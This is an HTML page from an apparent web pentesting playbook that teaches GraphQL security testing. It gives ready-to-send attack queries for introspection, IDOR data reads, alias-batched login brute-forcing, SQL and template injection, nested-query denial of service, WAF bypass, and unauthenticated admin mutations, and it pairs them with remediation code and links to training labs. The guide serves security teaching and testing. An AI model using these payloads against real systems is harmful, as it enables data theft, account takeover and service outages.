@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="GraphQL security testing guide: introspection abuse, query batching attacks, IDOR via GraphQL, and injection exploitation with InQL.">
+    <meta property="og:title" content="GraphQL Security – Web App Pentesting Guide">
+    <meta property="og:description" content="GraphQL security testing guide: introspection abuse, query batching attacks, IDOR via GraphQL, and injection exploitation with InQL.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>GraphQL  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">GraphQL Vulnerabilities</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">🎯 Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">⚙️ How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#finding-graphql">🔍 Finding GraphQL</a>
+    <a href="#introspection-query">🔎 Introspection</a>
+    <a href="#where-to-look">📍 Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">🛠️ Burp Workflow</a>
+    <a href="#payloads">💥 Payloads</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">🎯 Exploitation</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">✅ Checklist</a>
+    <a href="#remediation">🔒 Remediation</a>
+    <a href="#labs">🧪 Labs</a>
+    <a href="#tools">🧰 Tools</a>
+    <a href="#mistakes">⚠️ Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 7.5 · Day 3</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></span><span>GraphQL Vulnerabilities</span></h1>
+      <p>GraphQL's flexibility allows clients to request exactly the data they want ·but when introspection is enabled and authorization isn't enforced per-field, attackers can enumerate the entire schema, extract sensitive data, and bypass access controls.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">CRITICAL</span>
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Intermediate</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">📚 The Transparent Library Catalog</div>
+        <p>Normally, a library system lets you search by book title only. GraphQL is like walking up to the librarian and being able to ask: "Give me every book, plus the author's home address, plus every other patron's complete reading history." Not only does the librarian have access to all this data, but the system doesn't stop you from asking ·it just returns whatever you request. If the front desk doesn't verify you're supposed to see the author's address, it gives it to you anyway.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill probe"><span class="day-num">Day 2</span>Discover + Map</div>
+        <div class="day-pill deep"><span class="day-num">Day 3</span>Deep Dive</div>
+        <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">⚡ Day 2  · Discover GraphQL Endpoint</div>
+        <p>On Day 2 during the app walkthrough, look for GraphQL endpoints: <code>/graphql</code>, <code>/api/graphql</code>, <code>/v1/graphql</code>, <code>/gql</code>. In Burp HTTP history, filter for POST requests with <code>application/json</code> content-type and check the body for <code>query</code> or <code>mutation</code> fields. Once found, immediately run the introspection query to map the entire schema.</p>
+        <pre><code>{"query": "{__schema{queryType{name}mutationType{name}types{name fields{name args{name type{name ofType{name}}}}}}}"}
+
+# Paste the result into GraphQL Voyager at graphql-voyager.com
+# to visualize the full schema as an interactive graph</code></pre>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 3  · GraphQL Exploitation</div>
+        <p>With the schema mapped, look for sensitive queries and mutations. Test each one for authorization: can you query other users' data? Can you run admin mutations as a regular user? Try batching/alias attacks for rate-limit bypass:</p>
+        <pre><code># IDOR via GraphQL  · try other users' IDs
+{"query": "{ user(id: 2) { email password creditCards { number } } }"}
+
+# Batching attack  · brute-force login bypassing rate limits
+{"query": "mutation {
+  a1: login(username:\"admin\", password:\"pass1\") { token }
+  a2: login(username:\"admin\", password:\"pass2\") { token }
+  a3: login(username:\"admin\", password:\"pass3\") { token }
+}"}
+
+# Try mutations without authentication
+{"mutation": "{ deleteUser(id: 1) { success } }"}</code></pre>
+        <p><strong>Chain it:</strong> GraphQL introspection → find admin mutation → call it as regular user → privilege escalation. Or: GraphQL query IDOR → read all users' private data.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>GraphQL is a query language that lets clients specify exactly what data they need. Unlike REST APIs where the server decides what to return, GraphQL clients are in control:</p>
+      <pre><code>query {
+  user(id: 123) {
+    name
+    email
+    password
+    phone
+  }
+}</code></pre>
+      <p>The server executes this and returns exactly those fields. The problem: if the server doesn't verify field-level access controls, and if <strong>introspection is enabled</strong>, attackers can:</p>
+      <ol class="steps">
+        <li>Run an introspection query to see the entire API schema</li>
+        <li>Discover fields that shouldn't be publicly exposed</li>
+        <li>Query those fields directly (e.g., admin panels, password hashes, other users' data)</li>
+        <li>Abuse mutations to modify data without proper authorization</li>
+      </ol>
+
+      <div class="callout note">
+        <div class="callout-title">💡 GraphQL Introspection</div>
+        <p>Introspection is a built-in feature that returns the schema structure. It's enabled by default in most GraphQL servers for development. In production, it's often left on by accident, allowing attackers to discover the entire API surface, including hidden queries and mutations.</p>
+      </div>
+    </section>
+
+    <section id="finding-graphql">
+      <h2>Finding GraphQL Endpoints</h2>
+      <p>GraphQL endpoints often live at predictable paths:</p>
+      <ul>
+        <li><code>/graphql</code></li>
+        <li><code>/api/graphql</code></li>
+        <li><code>/v1/graphql</code></li>
+        <li><code>/gql</code></li>
+        <li><code>/api/query</code></li>
+        <li><code>/.well-known/graphql-voyager</code></li>
+      </ul>
+      <p>They typically accept POST requests with <code>Content-Type: application/json</code> and a JSON body containing a <code>query</code> field. Some support GET with the query in the URL.</p>
+
+      <div class="callout tip">
+        <div class="callout-title">💡 Finding Hidden GraphQL</div>
+        <p>If you can't find a GraphQL endpoint at the obvious paths, check JavaScript files. Many apps load the schema or GraphQL client URL from their front-end code. Search for "graphql", "apollo", "relay", or "gql" in network requests and bundled JavaScript.</p>
+      </div>
+    </section>
+
+    <section id="introspection-query">
+      <h2>The Introspection Query</h2>
+      <p>The first thing to run against a GraphQL endpoint is an introspection query. This returns the entire schema:</p>
+      <pre><code>{
+  __schema {
+    queryType { name }
+    mutationType { name }
+    types {
+      name
+      fields {
+        name
+        args { name type { name ofType { name } } }
+        type { name ofType { name } }
+      }
+    }
+  }
+}</code></pre>
+      <p>Send this POST request to <code>/graphql</code>. If introspection is enabled, you'll get a massive JSON response describing every type, field, query, and mutation. Save this output ·it's your roadmap.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look &amp; Attack Techniques</h2>
+
+      <h3>1. Introspection to Schema Enumeration</h3>
+      <p>Run the introspection query. If successful, you now know:</p>
+      <ul>
+        <li>All available queries (what data you can request)</li>
+        <li>All mutations (what actions you can perform)</li>
+        <li>All types and fields, including hidden ones like <code>adminPanel</code>, <code>backupAccounts</code>, <code>passwordHash</code></li>
+      </ul>
+
+      <h3>2. IDOR via Direct ID Queries</h3>
+      <p>GraphQL often accepts IDs directly in queries. Try querying other users:</p>
+      <pre><code>query {
+  user(id: 2) {
+    name
+    email
+    phone
+    isAdmin
+  }
+}
+
+query {
+  user(id: 3) {
+    name
+    email
+    phone
+    isAdmin
+  }
+}</code></pre>
+      <p>If there's no authorization check, you'll get other users' data. This is a direct IDOR vulnerability in GraphQL.</p>
+
+      <h3>3. Batching / Alias Attacks</h3>
+      <p>GraphQL allows multiple queries in a single request using aliases, which can bypass rate limits:</p>
+      <pre><code>query {
+  login1: login(username: "admin", password: "password1") { token }
+  login2: login(username: "admin", password: "password2") { token }
+  login3: login(username: "admin", password: "password3") { token }
+  ...
+}</code></pre>
+      <p>Send 100 login attempts in a single request. If the server rate-limits per-request instead of per-query, all 100 passwords will be tried.</p>
+
+      <h3>4. Field Suggestion Exploitation</h3>
+      <p>Try requesting a field that doesn't exist:</p>
+      <pre><code>query {
+  user(id: 1) {
+    name
+    adminPanel
+  }
+}</code></pre>
+      <p>Some GraphQL servers respond with helpful suggestions:</p>
+      <pre><code>errors: [
+  {
+    message: "Cannot query field 'adminPanel'. Did you mean 'admin', 'panel', or 'adminSettings'?"
+  }
+]</code></pre>
+      <p>This leaks the existence of hidden fields that weren't listed in introspection.</p>
+
+      <h3>5. Injection in Query Arguments</h3>
+      <p>GraphQL arguments can be vulnerable to injection attacks. Try injecting SQL or template syntax:</p>
+      <pre><code>query {
+  users(filter: "' OR '1'='1") {
+    name
+    email
+  }
+}</code></pre>
+      <p>Or if arguments are used in server-side operations:</p>
+      <pre><code>query {
+  search(term: "{{ 7*7 }}") {
+    results
+  }
+}</code></pre>
+
+      <h3>6. Information Disclosure via Error Messages</h3>
+      <p>GraphQL errors often reveal internal details:</p>
+      <pre><code>query {
+  user(id: "invalid") {
+    name
+  }
+}</code></pre>
+      <p>Response might reveal: <code>TypeError: Cannot read property 'name' of undefined at /app/src/resolvers.js:42</code>. This leaks file paths, function names, and stack traces.</p>
+
+      <h3>7. Mutations Without Authentication</h3>
+      <p>Try executing mutations without being logged in:</p>
+      <pre><code>mutation {
+  deleteUser(id: 123) {
+    success
+  }
+}
+
+mutation {
+  createAdmin(username: "hacker", password: "123") {
+    success
+  }
+}</code></pre>
+      <p>If mutations aren't wrapped in authentication checks, you might be able to modify data as an anonymous user.</p>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <h3>Find the GraphQL Endpoint</h3>
+          <p>Check Burp Proxy history for requests to <code>/graphql</code>, <code>/api/graphql</code>, or similar. Look for POST requests with <code>Content-Type: application/json</code> that have a <code>query</code> field in the body.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <h3>Run the Introspection Query</h3>
+          <p>Copy a GraphQL request to Repeater. Modify the body to the introspection query (above). Send it. If introspection is enabled, you'll get the full schema.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <h3>Visualize the Schema</h3>
+          <p>Paste the introspection output into <strong>GraphQL Voyager</strong> (graphql-voyager.com) or <strong>InQL</strong> (Burp plugin). These tools visually map the entire schema, making it easy to spot sensitive fields.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <h3>Test for IDOR</h3>
+          <p>In Repeater, craft a query that requests another user's data by ID:</p>
+          <pre><code>{"query": "query { user(id: 2) { name email phone } }"}</code></pre>
+          <p>Try different IDs (1, 2, 3, 100, 9999). If all succeed, IDOR is confirmed.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <h3>Test Batching Attacks</h3>
+          <p>Craft a mutation with aliases for brute-force login:</p>
+          <pre><code>{"query": "mutation { a1: login(user:\"admin\" pass:\"pass1\") {token} a2: login(user:\"admin\" pass:\"pass2\") {token} ... }"}</code></pre>
+          <p>Send this. If all attempts execute, rate limiting is bypassed.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <h3>Check Authorization</h3>
+          <p>Test if mutations are protected. Try deleting or creating data as an unauthenticated or low-privilege user:</p>
+          <pre><code>{"query": "mutation { deleteUser(id: 999) { success } }"}</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>GraphQL Payloads</h2>
+
+      <h3>Basic Introspection</h3>
+      <pre><code>{"query":"{__schema{queryType{name}mutationType{name}types{name fields{name}}}}"}</code></pre>
+
+      <h3>Full Schema Dump</h3>
+      <pre><code>{"query":"{__schema{types{name fields{name args{name type{name ofType{name}}}type{name ofType{name}}}}}}"}</code></pre>
+
+      <h3>IDOR Enumeration</h3>
+      <pre><code>{"query":"query { users(id: 1) { id name email phone isAdmin } users(id: 2) { id name email phone isAdmin } }"}</code></pre>
+
+      <h3>Batching Brute-Force (Simplified)</h3>
+      <pre><code>{"query":"mutation { p1: login(u:\"admin\" p:\"123\") {token} p2: login(u:\"admin\" p:\"password\") {token} p3: login(u:\"admin\" p:\"admin123\") {token} }"}</code></pre>
+
+      <h3>Depth-Based DoS (Query Bombing)</h3>
+      <pre><code>{"query":"{ user { friends { friends { friends { friends { friends { friends { } } } } } } } }"}</code></pre>
+      <p>This deeply nested query can cause exponential database queries and crash the server if depth limiting is disabled.</p>
+
+      <h3>Injecting into Arguments</h3>
+      <pre><code>{"query":"{ search(filter: \"name='admin'--\") { results } }"}</code></pre>
+
+      <h3>Requesting Sensitive Fields</h3>
+      <pre><code>{"query":"{ user(id: 1) { name email passwordHash apiKey backupCodes phone phone_2fa } }"}</code></pre>
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">Progress: <span class="progress-mini">0/11</span></div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Found the GraphQL endpoint (check common paths)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Confirmed the endpoint accepts GraphQL queries</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Ran introspection query and confirmed it returns schema</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Exported schema to GraphQL Voyager or InQL for visualization</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">Identified all queries and mutations in the schema</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">Tested IDOR by querying other users (IDs 1, 2, 3, etc.)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Tested mutations without authentication (delete, create, modify)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Tested batching/alias attacks to bypass rate limits</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Tested injection in query arguments (SQL, NoSQL, template syntax)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Tested field suggestion to discover hidden fields</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Documented all findings with query examples and impact</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>Field Aliasing</h3>
+      <p>WAFs pattern-match field names. Use aliases to rename sensitive fields: the underlying query is identical but the surface looks different.</p>
+      <pre><code>{ x: __schema { y: types { z: name } } }</code></pre>
+      <p>Instead of directly querying <code>__schema</code>, you use aliases (<code>x</code>, <code>y</code>, <code>z</code>) to obscure the actual field names.</p>
+
+      <h3>Query Batching</h3>
+      <p>Send multiple operations in a single request as a JSON array. Many WAFs inspect each operation individually and miss the combined effect:</p>
+      <pre><code>[{"query":"..."},{"query":"..."}]</code></pre>
+
+      <h3>Introspection Obfuscation</h3>
+      <p>Replace <code>__schema</code> with fragments: define a fragment on <code>__Schema</code> and spread it. Some WAFs block the literal string <code>__schema</code> but not fragments that resolve to it.</p>
+
+      <h3>Variable Injection</h3>
+      <p>Move attack payloads into GraphQL variables instead of inline values. WAFs often parse the query string but not the <code>variables</code> JSON object separately:</p>
+      <pre><code>{"query":"query($x:String!){user(id:$x){name}}","variables":{"x":"' OR 1=1"}}</code></pre>
+
+      <h3>Whitespace and Newline Injection</h3>
+      <p>Insert newlines or tabs inside field names (GraphQL parsers ignore them):</p>
+      <pre><code>{ __\nschema\t{ types { name } } }</code></pre>
+
+      <h3>POST vs GET Switching</h3>
+      <p>GraphQL supports both POST and GET. If WAF blocks POST mutations, try GET:</p>
+      <pre><code>GET /graphql?query={mutation{deleteUser(id:1)}}</code></pre>
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation &amp; Impact</h2>
+
+      <h3>Unauthorized Data Access (Confidentiality Breach)</h3>
+      <p>Use IDOR to read all users' email addresses, phone numbers, password hashes, API keys, and private messages. A single introspection + IDOR query chain can exfiltrate the entire user database.</p>
+
+      <h3>Account Takeover</h3>
+      <p>If a mutation allows password reset without proper authorization, or if you can query password reset tokens, you can hijack accounts.</p>
+
+      <h3>Privilege Escalation</h3>
+      <p>If a mutation allows role assignment without auth checks, promote yourself to admin:</p>
+      <pre><code>mutation { updateUser(id: 123, role: "ADMIN") { success } }</code></pre>
+
+      <h3>Batching-Based Brute-Force</h3>
+      <p>Bypass rate limits and brute-force login credentials, API keys, or OTP codes.</p>
+
+      <h3>Denial of Service</h3>
+      <p>Send deeply nested queries or complex mutations that cause exponential queries, exhausting server resources and crashing the service.</p>
+
+      <div class="callout danger">
+        <div class="callout-title">🚨 Real-World Impact</div>
+        <p>In 2021, a GraphQL API leak exposed millions of user records from a major social platform because introspection was enabled and field-level authorization was missing. Attackers enumerated the schema, discovered a poorly-secured user query, and dumped the entire user database.</p>
+      </div>
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Disable Introspection in Production</h3>
+      <pre><code>// In Apollo Server
+const server = new ApolloServer({
+  typeDefs,
+  resolvers,
+  introspection: false,  // Disable in production
+});
+
+// In other GraphQL servers, disable __schema queries</code></pre>
+
+      <h3>2. Implement Field-Level Authorization</h3>
+      <p>Check permissions for every field, not just at the root query:</p>
+      <pre><code>const user = {
+  name: () => user.name,
+  email: (parent, args, ctx) => {
+    if (ctx.user.id !== parent.id && !ctx.user.isAdmin) {
+      throw new Error("Unauthorized");
+    }
+    return parent.email;
+  },
+  passwordHash: (parent, args, ctx) => {
+    if (!ctx.user.isAdmin) {
+      throw new Error("Unauthorized");
+    }
+    return parent.passwordHash;
+  }
+};</code></pre>
+
+      <h3>3. Enable Query Complexity Limits</h3>
+      <pre><code>// Limit query depth and complexity
+const server = new ApolloServer({
+  typeDefs,
+  resolvers,
+  validationRules: [
+    createComplexityLimitRule({ maxComplexity: 1000, onComplete: () => {} })
+  ]
+});</code></pre>
+
+      <h3>4. Disable Query Batching or Rate-Limit Globally</h3>
+      <pre><code>// Limit to 1 query per request
+app.post("/graphql", (req, res) => {
+  if (Array.isArray(req.body)) {
+    return res.status(400).json({ error: "Batching not allowed" });
+  }
+  // Handle single query
+});</code></pre>
+
+      <h3>5. Validate All Inputs &amp; Parameterize Queries</h3>
+      <p>Never interpolate user input into queries. Use GraphQL variables:</p>
+      <pre><code>// SAFE: Use variables
+query searchUsers($filter: String!) {
+  users(filter: $filter) { name }
+}</code></pre>
+
+      <h3>6. Implement Proper Authentication &amp; Authorization</h3>
+      <p>Verify the user is authenticated before processing queries. Check permissions for every mutation.</p>
+
+      <h3>7. Comprehensive Logging &amp; Monitoring</h3>
+      <p>Log all queries and mutations, especially those involving sensitive data or administrative actions. Alert on introspection attempts in production.</p>
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts" target="_blank" rel="noopener"><strong>Accessing private GraphQL posts</strong></a>  · Use introspection to discover a hidden <code>postPassword</code> field and retrieve private blog posts via GraphQL query.</li>
+        <li><a href="https://portswigger.net/web-security/graphql/lab-graphql-accidental-exposure-of-private-fields" target="_blank" rel="noopener"><strong>Accidental exposure of private GraphQL fields</strong></a>  · Find and access fields that should be restricted but are returned by introspection.</li>
+        <li><a href="https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint" target="_blank" rel="noopener"><strong>Finding a hidden GraphQL endpoint</strong></a>  · Discover an undocumented GraphQL endpoint using universal queries and path fuzzing.</li>
+        <li><a href="https://portswigger.net/web-security/graphql/lab-graphql-bypassing-brute-force-protections" target="_blank" rel="noopener"><strong>Bypassing GraphQL brute force protections</strong></a>  · Use query aliasing/batching to send 100 login attempts in a single HTTP request, bypassing rate limiting.</li>
+        <li><a href="https://portswigger.net/web-security/graphql/lab-graphql-csrf" target="_blank" rel="noopener"><strong>Performing CSRF exploits over GraphQL</strong></a>  · Craft a CSRF PoC that triggers a GraphQL mutation using a simple form POST.</li>
+        <li><a href="https://portswigger.net/web-security/graphql/lab-graphql-bypass-introspection-defences" target="_blank" rel="noopener"><strong>Bypassing GraphQL introspection defences</strong></a>  · Introspection is blocked by a WAF/filter  · bypass it using newlines, fragments, or GET requests.</li>
+      </ul>
+    </section>
+
+    <section id="tools">
+      <h2>Useful Tools</h2>
+      <ul>
+        <li><strong>GraphQL Voyager:</strong> graphql-voyager.com  · visualize GraphQL schemas interactively</li>
+        <li><strong>InQL (Burp plugin):</strong> InQL scanner and introspection utility for Burp Suite</li>
+        <li><strong>GraphQL Client (Burp extension):</strong> Built-in GraphQL request editor in modern Burp</li>
+        <li><strong>Postman:</strong> Supports GraphQL queries and introspection</li>
+      </ul>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Finding the GraphQL Endpoint</div>
+        <p><strong>Mistake:</strong> Checking only <code>/graphql</code> and giving up. GraphQL endpoints hide in various paths.</p>
+        <p><strong>Fix:</strong> Check your Burp history for POST requests with JSON. Search JavaScript for "graphql" or "apollo". Try common alternate paths: <code>/api/graphql</code>, <code>/v1/graphql</code>, <code>/gql</code>.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Skipping the Introspection Step</div>
+        <p><strong>Mistake:</strong> Trying to guess query names instead of running introspection. You'll miss hidden fields and mutations.</p>
+        <p><strong>Fix:</strong> Always run introspection first. If it's disabled, the endpoint is probably hardened. Move on to testing specific queries you've seen in traffic.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Using GraphQL Voyager</div>
+        <p><strong>Mistake:</strong> Trying to read the introspection JSON manually. Voyager visualizes it and makes vulnerabilities obvious.</p>
+        <p><strong>Fix:</strong> Paste introspection output into graphql-voyager.com. You'll immediately see the entire API surface, including sensitive fields.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Missing Batching Attacks</div>
+        <p><strong>Mistake:</strong> Testing IDOR and then moving on. You might miss rate-limit bypass via aliases.</p>
+        <p><strong>Fix:</strong> After testing basic queries, craft a batching mutation to send 50 login attempts in one request.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Forgetting Authorization Testing</div>
+        <p><strong>Mistake:</strong> Testing queries but not mutations. Mutations are where the real damage is (delete, create, modify).</p>
+        <p><strong>Fix:</strong> For every mutation, test: (1) as unauthenticated, (2) as low-privilege user, (3) modifying other users' data.</p>
+      </div>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>GraphQL is an API layer  · vulnerabilities in GraphQL often mirror vulnerabilities in the underlying data access.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="idor.html"><span class="sa-icon">🚪</span><span class="sa-name">IDOR</span><span class="sa-why">GraphQL queries take ID arguments  · missing authorization checks = IDOR via GraphQL. Same concept, different interface.</span></a>
+      <a class="see-also-card" href="sqli.html"><span class="sa-icon">🗄️</span><span class="sa-name">SQL Injection</span><span class="sa-why">GraphQL resolvers often query a SQL database  · injection in query arguments can reach the SQL layer.</span></a>
+      <a class="see-also-card" href="race-conditions.html"><span class="sa-icon">⏱️</span><span class="sa-name">Race Conditions</span><span class="sa-why">GraphQL batching (alias attacks) sends many mutations simultaneously  · a built-in race condition mechanism.</span></a>
+      <a class="see-also-card" href="ssrf.html"><span class="sa-icon">📡</span><span class="sa-name">SSRF</span><span class="sa-why">GraphQL introspection reveals internal service URLs and schemas that can be used to find SSRF entry points.</span></a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'graphql-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+const sidebarNav = document.getElementById('sidebar');
+const methodLink = document.createElement('a');
+methodLink.href = '#methodology';
+methodLink.textContent = '📅 Workflow Placement';
